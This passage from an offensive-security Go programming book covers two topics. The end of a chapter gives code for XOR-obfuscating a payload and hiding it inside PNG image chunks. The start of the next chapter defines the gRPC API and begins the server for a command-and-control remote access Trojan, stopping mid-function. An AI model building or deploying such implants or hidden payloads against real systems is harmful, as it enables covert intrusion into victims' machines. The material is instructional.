❶ offset, _ := strconv.ParseInt(c.Offset, 10, 64)
❷ b.Seek(offset, 0)
❸ m.readChunk(b)
origData := m.Chk.Data
❹ m.Chk.Data = utils.XorDecode(m.Chk.Data, c.Key)
m.Chk.CRC = m.createChunkCRC()
❺ bm := m.marshalData()
bmb := bm.Bytes()
fmt.Printf("Payload Original: % X\n", origData)
fmt.Printf("Payload Decode: % X\n", m.Chk.Data)
❻ utils.WriteData(b, c, bmb)
}
Listing 13-20: Decoding the image file and payload (/ch-
13/imgInject/pnglib/commands.go)
The block requires the offset position of the chunk segment
that contains the payload ❶. You use the offset to Seek() ❷ the
file position, along with a subsequent call to readChunk() ❸
that’s necessary to derive the SIZE, TYPE, DATA, and CRC values.
A call to XorDecode() ❹ takes the chk.Data payload value and the
same secret key used to encode the data, and then assigns the
decoded payload value back to chk.Data. (Remember that this is
symmetric encryption, so you use the same key to both encrypt
and decrypt the data.) The code block continues by calling
marshalData() ❺, which converts your Chunk struct to a byte slice.
Finally, you write the new chunk segment containing the
decoded payload to a file by using the WriteData() function ❻.
A command line run of your program, this time with a
decode argument, should produce the result in Listing 13-21.
$ go run main.go -i encodePNGfile -o decodePNGfile --offset 0x85258 -
decode \
--key gophersValid PNG so let us continue!
❶ Payload Original: 56 5D 43 5C 57 46 40 52 5D 45 5D 57 40 46 52 5D 45 5A 57
46 46 55 5C 45 5D 50 40 46
❷ Payload Decode: 31 32 33 34 32 34 33 35 32 35 35 32 32 35 35 32 35 32 32 34
35 32 33 35 35 35 32 35
Success: decodePNGfile created
Listing 13-21: Running the imgInject program to XOR decode a data chunk block
The Payload Original value ❶ is the encoded payload data read
from the original PNG file, while the Payload Decode value ❷ is
the decrypted payload. If you compare your sample command
line run from before and the output here, you’ll notice that
your decoded payload matches the original, cleartext value
you supplied originally.
There is a problem with the code, though. Recall that the
program code injects your new decoded chunk at an offset
position of your specification. If you have a file that already
contains the encoded chunk segment and then attempt to write
a new file with a decoded chunk segment, you’ll end up with
both chunks in the new output file. You can see this in Figure
13-5.
Figure 13-5: The output file contains both the decoded chunk segment and encoded
chunk segment.
To understand why this happens, recall that the encoded
PNG file has the encoded chunk segment at offset 0x85258, as
shown in Figure 13-6.
Figure 13-6: The output file containing the encoded chunk segment
The problem presents itself when the decoded data is
written to offset 0x85258. When the decoded data gets written to
the same location as the encoded data, our implementation
doesn’t delete the encoded data; it merely shifts the remainder
of the file bytes to the right, including the encoded chunk
segment, as illustrated previously in Figure 13-5. This can
complicate payload extraction or produce unintended
consequences, such as revealing the cleartext payload to
network devices or security software.
Fortunately, this issue is quite easy to resolve. Let’s take a
look at our previous WriteData() function. This time, you can
modify it to address the problem (Listing 13-22).
//WriteData writes new data to offset
func WriteData(r *bytes.Reader, c *models.CmdLineOpts, b []byte) {
offset, err := strconv.ParseInt(c.Offset, 10, 64)
if err != nil {
log.Fatal(err)
}
w, err := os.OpenFile(c.Output, os.O_RDWR|os.O_CREATE, 0777)
if err != nil {
log.Fatal("Fatal: Problem writing to the output file!")
}
r.Seek(0, 0)
var buff = make([]byte, offset)
r.Read(buff)
w.Write(buff)
w.Write(b)
❶ if c.Decode {
❷ r.Seek(int64(len(b)), 1)
}
❸ _, err = io.Copy(w, r)
if err == nil {
fmt.Printf("Success: %s created\n", c.Output)
}
}
Listing 13-22: Updating WriteData() to prevent duplicate ancillary chunk types (/ch-
13/imgInject/utils/writer.go)
You introduce the fix with the c.Decode conditional logic ❶.
The XOR operation produces a byte-for-byte transaction.
Therefore, the encoded and decoded chunk segments are
identical in length. Furthermore, the bytes.Reader will contain the
remainder of the original encoded image file at the moment
the decoded chunk segment is written. So, you can perform a
right byte shift comprising the length of the decoded chunk
segment on the bytes.Reader ❷, advancing the bytes.Reader past the
encoded chunk segment and writing the remainder of bytes to
your new image file ❸.
Voila! As you can see in Figure 13-7, the hex editor
confirms that you resolved the problem. No more duplicate
ancillary chunk types.
Figure 13-7: The output file without duplicate ancillary data
The encoded data no longer exists. Additionally, running ls
-la against the files should produce identical file lengths, even
though file bytes have changed.
SUMMARY
In this chapter, you learned how to describe the PNG image
file format as a series of repetitive byte chunk segments, each
with its respective purpose and applicability. Next, you
learned methods of reading and navigating the binary file.
Then you created byte data and wrote it to an image file.
Finally, you used XOR encoding to obfuscate your payload.
This chapter focused on image files and only scratched the
surface of what you can accomplish by using steganography
techniques. But you should be able to apply what you learned
here to explore other binary file types.
ADDITIONAL EXERCISES
Like many of the other chapters in this book, this chapter will
provide the most value if you actually code and experiment
along the way. Therefore, we want to conclude with a few
challenges to expand on the ideas already covered:
1. While reading the XOR section, you may have noticed that the XorDecode()
function produces a decoded chunk segment, but never updates the CRC
checksum. See if you can correct this issue.
2. The WriteData() function facilitates the ability to inject arbitrary chunk
segments. What code changes would you have to make if you wanted to
overwrite existing ancillary chunk segments? If you need help, our explanation
about byte shifting and the Seek() function may be useful in solving this
problem.
3. Here’s a more challenging problem: try to inject a payload—the PNG DATA
byte chunk—by distributing it throughout various ancillary chunk segments.
You could do this one byte at a time, or with multiple groupings of bytes, so get
creative. As an added bonus, create a decoder that reads exact payload byte
offset locations, making it easier to extract the payload.
4. The chapter explained how to use XOR as a confidentiality technique—a
method to obfuscate the implanted payload. Try to implement a different
technique, such as AES encryption. Go core packages provide a number of
possibilities (see Chapter 11 if you need a refresher). Observe how the solution
affects the new image. Does it cause the overall size to increase, and if so, by
how much?
5. Use the code ideas within this chapter to expand support for other image file
formats. Other image specifications may not be as organized as PNG. Want
proof? Give the PDF specification a read, as it can be rather intimidating. How
would you solve the challenges of reading and writing data to this new image
format?
14
BUILDING A COMMAND-AND-
CONTROL RAT
In this chapter, we’ll tie together several lessons from the
previous chapters to build a basic command and control (C2)
remote access Trojan (RAT). A RAT is a tool used by
attackers to remotely perform actions on a compromised
victim’s machine, such as accessing the filesystem, executing
code, and sniffing network traffic.
Building this RAT requires building three separate tools: a
client implant, a server, and an admin component. The client
implant is the portion of the RAT that runs on a compromised
workstation. The server is what will interact with the client
implant, much like the way Cobalt Strike’s team server—the
server component of the widely used C2 tool—sends
commands to compromised systems. Unlike the team server,
which uses a single service to facilitate server and
administrative functions, we’ll create a separate, stand-alone
admin component used to actually issue the commands. This
server will act as the middleman, choreographing
communications between compromised systems and the
attacker interacting with the admin component.
There are an infinite number of ways to design a RAT. In
this chapter, we aim to highlight how to handle client and
server communications for remote access. For this reason,
we’ll show you how to build something simple and
unpolished, and then prompt you to create significant
improvements that should make your specific version more
robust. These improvements, in many cases, will require you
to reuse content and code examples from previous chapters.
You’ll apply your knowledge, creativity, and problem-solving
ability to enhance your implementation.
GETTING STARTED
To get started, let’s review what we’re going to do: we’ll
create a server that receives work in the form of operating
system commands from an admin component (which we’ll
also create). We’ll create an implant that polls the server
periodically to look for new commands and then publishes the
command output back onto the server. The server will then
hand that result back to the administrative client so that the
operator (you) can see the output.
Let’s start by installing a tool that will help us handle all
these network interactions and reviewing the directory
structure for this project.
Installing Protocol Buffers for Defining a gRPC API
We’ll build all the network interactions by using gRPC, a
high-performance remote procedure call (RPC) framework
created by Google. RPC frameworks allow clients to
communicate with servers over standard and defined protocols
without having to understand any of the underlying details.
The gRPC framework operates over HTTP/2, communicating
messages in a highly efficient, binary structure.
Much like other RPC mechanisms, such as REST or
SOAP, our data structures need to be defined in order to make
them easy to serialize and deserialize. Luckily for us, there’s a
mechanism for defining our data and API functions so we can
use them with gRPC. This mechanism, Protocol Buffers (or
Protobuf, for short), includes a standard syntax for API and
complex data definitions in the form of a .proto file. Tooling
exists to compile that definition file into Go-friendly interface
stubs and data types. In fact, this tooling can produce output in
a variety of languages, meaning you can use the .proto file to
generate C# stubs and types.
Your first order of business is to install the Protobuf
compiler on your system. Walking through the installation is
outside the scope of this book, but you’ll find full details under
the “Installation” section of the official Go Protobuf repository
at https://github.com/golang/protobuf/. Also, while you’re at
it, install the gRPC package with the following command:
> go get -u google.golang.org/grpc
Creating the Project Workspace
Next, let’s create our project workspace. We’ll create four
subdirectories to account for the three components (the
implant, server, and admin component) and the gRPC API
definition files. In each of the component directories, we’ll
create a single Go file (of the same name as the encompassing
directory) that’ll belong to its own main package. This lets us
independently compile and run each as a stand-alone
component and will create a descriptive binary name in the
event we run go build on the component. We’ll also create a file
named implant.proto in our grpcapi directory. That file will
hold our Protobuf schema and gRPC API definitions. Here’s
the directory structure you should have:
$ tree
.
|-- client
| |-- client.go
|-- grpcapi
| |-- implant.proto
|-- implant
| |-- implant.go
|-- server
|-- server.go
With the structure created, we can begin building our
implementation. Throughout the next several sections, we’ll
walk you through the contents of each file.
DEFINING AND BUILDING THE
GRPC API
The next order of business is to define the functionality and
data our gRPC API will use. Unlike building and consuming
REST endpoints, which have a fairly well-defined set of
expectations (for example, they use HTTP verbs and URL
paths to define which action to take on which data), gRPC is
more arbitrary. You effectively define an API service and tie
to it the function prototypes and data types for that service.
We’ll use Protobufs to define our API. You can find a full
explanation of the Protobuf syntax with a quick Google
search, but we’ll briefly explain it here.
At a minimum, we’ll need to define an administrative
service used by operators to send operating system commands
(work) to the server. We’ll also need an implant service used
by our implant to fetch work from the server and send the
command output back to the server. Listing 14-1 shows the
contents of the implant.proto file. (All the code listings at the
root location of / exist under the provided github repo
https://github.com/blackhat-go/bhg/.)
//implant.proto
syntax = "proto3";
❶ package grpcapi;
// Implant defines our C2 API functions
❷ service Implant {
rpc FetchCommand (Empty) returns (Command);
rpc SendOutput (Command) returns (Empty);
}
// Admin defines our Admin API functions
❸ service Admin {
rpc RunCommand (Command) returns (Command);
}
// Command defines a with both input and output fields
❹ message Command {
string In = 1;
string Out = 2;
}
// Empty defines an empty message used in place of null
❺ message Empty {
}
Listing 14-1: Defining the gRPC API by using Protobuf (/ch-
14/grpcapi/implant.proto)
Recall how we intend to compile this definition file into
Go-specific artifacts? Well, we explicitly include package grpcapi
❶ to instruct the compiler that we want these artifacts created
under the grpcapi package. The name of this package is
arbitrary. We picked it to ensure that the API code remains
separate from the other components.
Our schema then defines a service named Implant and a
service named Admin. We’re separating these because we
expect our Implant component to interact with our API in a
different manner than our Admin client. For example, we
wouldn’t want our Implant sending operating system command
work to our server, just as we don’t want to require our Admin
component to send command output to the server.
We define two methods on the Implant service: FetchCommand
and SendOutput ❷. Defining these methods is like defining an
interface in Go. We’re saying that any implementation of the
Implant service will need to implement those two methods.
FetchCommand, which takes an Empty message as a parameter and
returns a Command message, will retrieve any outstanding
operating system commands from the server. SendOutput will
send a Command message (which contains command output)
back to the server. These messages, which we’ll cover
momentarily, are arbitrary, complex data structures that
contain fields necessary for us to pass data back and forth
between our endpoints.
Our Admin service defines a single method: RunCommand,
which takes a Command message as a parameter and expects to
read a Command message back ❸. Its intention is to allow you,
the RAT operator, to run an operating system command on a
remote system that has a running implant.
Lastly, we define the two messages we’ll be passing
around: Command and Empty. The Command message contains two
fields, one used for maintaining the operating system
command itself (a string named In) and one used for
maintaining the command output (a string named Out) ❹. Note
that the message and field names are arbitrary, but that we
assign each field a numerical value. You might be wondering
how we can assign In and Out numerical values if we defined
them to be strings. The answer is that this is a schema
definition, not an implementation. Those numerical values
represent the offset within the message itself where those
fields will appear. We’re saying In will appear first, and Out
will appear second. The Empty message contains no fields ❺.
This is a hack to work around the fact that Protobuf doesn’t
explicitly allow null values to be passed into or returned from
an RPC method.
Now we have our schema. To wrap up the gRPC definition,
we need to compile the schema. Run the following command
from the grpcapi directory:
> protoc -I . implant.proto --go_out=plugins=grpc:./
This command, which is available after you complete the
initial installation we mentioned earlier, searches the current
directory for the Protobuf file named implant.proto and
produces Go-specific output in the current directory. Once you
execute it successfully, you should have a new file named
implant.pb.go in your grpcapi directory. This new file contains
the interface and struct definitions for the services and messages
created in the Protobuf schema. We’ll leverage this for
building our server, implant, and admin component. Let’s
build these one by one.
CREATING THE SERVER
Let’s start with the server, which will accept commands from
the admin client and polling from the implant. The server will
be the most complicated of the components, since it’ll need to
implement both the Implant and Admin services. Plus, since it’s
acting as a middleman between the admin component and
implant, it’ll need to proxy and manage messages coming to
and from each side.
Implementing the Protocol Interface
Let’s first look at the guts of our server in server/server.go
(Listing 14-2). Here, we’re implementing the interface
methods necessary for the server to read and write commands
from and to shared channels.
❶ type implantServer struct {
work, output chan *grpcapi.Command
}
type adminServer struct {
work, output chan *grpcapi.Command
}
❷ func NewImplantServer(work, output chan *grpcapi.Command) *implantServer
{
s := new(implantServer)
s.work = work
s.output = output
return s
}
func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
s := new(adminServer)
s.work = work
s.output = output
return s
}
❸ func (s *implantServer) FetchCommand(ctx context.Context, \
empty *grpcapi.Empty) (*grpcapi.Command, error) {
var cmd = new(grpcapi.Command)
❹ select {
case cmd, ok := <-s.work:
if ok {
return cmd, nil